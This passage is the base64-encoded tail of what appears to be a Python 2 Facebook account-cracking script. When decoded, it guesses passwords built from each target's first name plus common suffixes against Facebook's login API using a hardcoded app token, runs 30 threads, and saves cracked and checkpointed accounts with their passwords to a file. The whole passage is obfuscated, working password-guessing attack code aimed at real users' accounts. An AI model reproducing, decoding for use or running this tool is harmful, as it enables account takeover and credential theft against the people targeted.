Wpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CgkJCQkJCXByaW50ICdceDFiWzE7OTJtU3VjY2Vzc2Z1bFx4MWJbMTs5N20tXHgxYlsxOzkybeKcp1x4MWJbMTs5N20tJyArIHVzZXIgKyAnLVx4MWJbMTs5Mm3inKdceDFiWzE7OTdtLScgKyBwYXNzMgoJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczIpCgkJCQkJZWxzZToKCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgoJCQkJCQkJcHJpbnQgJ1x4MWJbMTs5MW1DaGVja3BvaW50XHgxYlsxOzk3bS1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgdXNlciArICctXHgxYlsxOzkxbeKcp1x4MWJbMTs5N20tJyArIHBhc3MyCgkJCQkJCQljZWsgPSBvcGVuKCJvdXQvY2hlY2twb2ludC50eHQiLCAiYSIpCgkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczIrIlxuIikKCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzMikKCQkJCQkJZWxzZToKCQkJCQkJCXBhc3MzID0gYlsnZmlyc3RfbmFtZSddICsgJzEyMzQ1JwoJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczMpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJCQlwcmludCAnXHgxYlsxOzkybVN1Y2Nlc3NmdWxceDFiWzE7OTdtLVx4MWJbMTs5Mm3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTJt4pynXHgxYlsxOzk3bS0nICsgcGFzczMKCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczMpCgkJCQkJCQllbHNlOgoJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMTs5MW1DaGVja3BvaW50XHgxYlsxOzk3bS1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgdXNlciArICctXHgxYlsxOzkxbeKcp1x4MWJbMTs5N20tJyArIHBhc3MzCgkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9jaGVja3BvaW50LnR4dCIsICJhIikKCQkJCQkJCQkJY2VrLndyaXRlKHVzZXIrInwiK3Bhc3MzKyJcbiIpCgkJCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MzKQoJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCXBhc3M0ID0gYlsnZmlyc3RfbmFtZSddICsgJzEyMycKCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczQpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CgkJCQkJCQkJCQlwcmludCAnXHgxYlsxOzkybVN1Y2Nlc3NmdWxceDFiWzE7OTdtLVx4MWJbMTs5Mm3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTJt4pynXHgxYlsxOzk3bS0nICsgcGFzczQKCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNCkKCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKCQkJCQkJCQkJCQlwcmludCAnXHgxYlsxOzkxbUNoZWNrcG9pbnRceDFiWzE7OTdtLVx4MWJbMTs5MW3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgcGFzczQKCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvY2hlY2twb2ludC50eHQiLCAiYSIpCgkJCQkJCQkJCQkJY2VrLndyaXRlKHVzZXIrInwiK3Bhc3M0KyJcbiIpCgkJCQkJCQkJCQkJY2VrLmNsb3NlKCkKCQkJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzNCkKCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJcGFzczUgPSBiWydmaXJzdF9uYW1lJ10gKyAnNzg2JwoJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3M1KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMTs5Mm1TdWNjZXNzZnVsXHgxYlsxOzk3bS1ceDFiWzE7OTJt4pynXHgxYlsxOzk3bS0nICsgdXNlciArICctXHgxYlsxOzkybeKcp1x4MWJbMTs5N20tJyArIHBhc3M1CgkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNSkKCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQlwcmludCAnXHgxYlsxOzkxbUNoZWNrcG9pbnRceDFiWzE7OTdtLVx4MWJbMTs5MW3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgcGFzczUKCQkJCQkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9jaGVja3BvaW50LnR4dCIsICJhIikKCQkJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzNSsiXG4iKQoJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkKCQkJCQkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M1KQoJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJcGFzczYgPSBiWydmaXJzdF9uYW1lJ10gKyAnMTInCgkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgoJCQkJCQkJCQkJCQkJCXByaW50ICdceDFiWzE7OTJtU3VjY2Vzc2Z1bFx4MWJbMTs5N20tXHgxYlsxOzkybeKcp1x4MWJbMTs5N20tJyArIHVzZXIgKyAnLVx4MWJbMTs5Mm3inKdceDFiWzE7OTdtLScgKyBwYXNzNgoJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNikKCQkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgoJCQkJCQkJCQkJCQkJCQlwcmludCAnXHgxYlsxOzkxbUNoZWNrcG9pbnRceDFiWzE7OTdtLVx4MWJbMTs5MW3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgcGFzczYKCQkJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L2NoZWNrcG9pbnQudHh0IiwgImEiKQoJCQkJCQkJCQkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczYrIlxuIikKCQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkKCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczYpCgkJCQkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJCQkJYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyt1c2VyKycvP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCQkJCQkJCQkJCQkJCQliID0ganNvbi5sb2FkcyhhLnRleHQpCgkJCQkJCQkJCQkJCQkJCXBhc3M3ID0gYlsnZmlyc3RfbmFtZSddICsgJzEyMzQnCgkJCQkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3M3KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMTs5Mm1TdWNjZXNzZnVsXHgxYlsxOzk3bS1ceDFiWzE7OTJt4pynXHgxYlsxOzk3bS0nICsgdXNlciArICctXHgxYlsxOzkybeKcp1x4MWJbMTs5N20tJyArIHBhc3M3CgkJCQkJCQkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczcpCgkJCQkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMTs5MW1DaGVja3BvaW50XHgxYlsxOzk3bS1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgdXNlciArICctXHgxYlsxOzkxbeKcp1x4MWJbMTs5N20tJyArIHBhc3M3CgkJCQkJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L2NoZWNrcG9pbnQudHh0IiwgImEiKQoJCQkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzNysiXG4iKQoJCQkJCQkJCQkJCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczcpCgkJCQkJCQkJCQkJCQkJCQkJCgkJCQkJCQkJCQkJCQkJCQoJCWV4Y2VwdDoKCQkJcGFzcwoJCQoJcCA9IFRocmVhZFBvb2woMzApCglwLm1hcChtYWluLCBpZCkKCXByaW50ICJcMDMzWzE7OTdtwqstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVwwMzNbMTs5Mm3inKfinKdcMDMzWzE7OTdtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS3CuyIKCXByaW50ICJcMDMzWzE7OTFtwqstLS0tLS0tLS0tLURldmVsb3BlZCBCeSBPbWkgQ2hhdWRoYXJ5LS0tLS0tLS0tLS3CuyIKCXByaW50ICdcMDMzWzE7OTJtUHJvY2VzcyBIYXMgQmVlbiBDb21wbGV0ZWRcMDMzWzE7OTJtLi4uLicKCXByaW50IlwwMzNbMTs5Mm1Ub3RhbCBPSy9ceDFiWzE7OTNtQ1AgXDAzM1sxOzkxbTogXDAzM1sxOzkybSIrc3RyKGxlbihva3MpKSsiXDAzM1sxOzk3bS9cMDMzWzE7OTNtIitzdHIobGVuKGNla3BvaW50KSkKCXByaW50ICIiIgogICAgICAgICAgICAgICAgIC4tLSwgICAgICAgLi0tLAogICAgICAgICAgICAgICAgKCAoICBcLi0tLS4vICApICkKICAgICAgICAgICAgICAgICAnLl9fL28gICBvXF9fLicKICAgICAgICAgICAgICAgICAgICB7PSAgXiAgPX0KICAgICAgICAgICAgICAgICAgICAgPiAgLSAgPAogICAuLS0tLS0tLS0tLS0tLS4iImAtLS0tLS0tYCIiLi0tLS0tLS0tLS0tLS0uCiAgIDogXDAzM1sxOzkybSAgICAgSG9wZSBZb3UgV2lsbCBDb21lIEJhY2sgU29vbi4uICAgIFwwMzNbMTs5M20gOgogICAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nIAogICAgICAgICAgICAgICAgICAgX19fKSggKShfX18KICAgICAgICAgICAgICAgICAgKCgoX18pIChfXykpKSIiIgoJCglyYXdfaW5wdXQoIlxuXDAzM1sxOzk2bVtcMDMzWzE7OTdtQmFja1wwMzNbMTs5Nm1dIikKCW1lbnUoKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKCWxvZ2luKCk='))
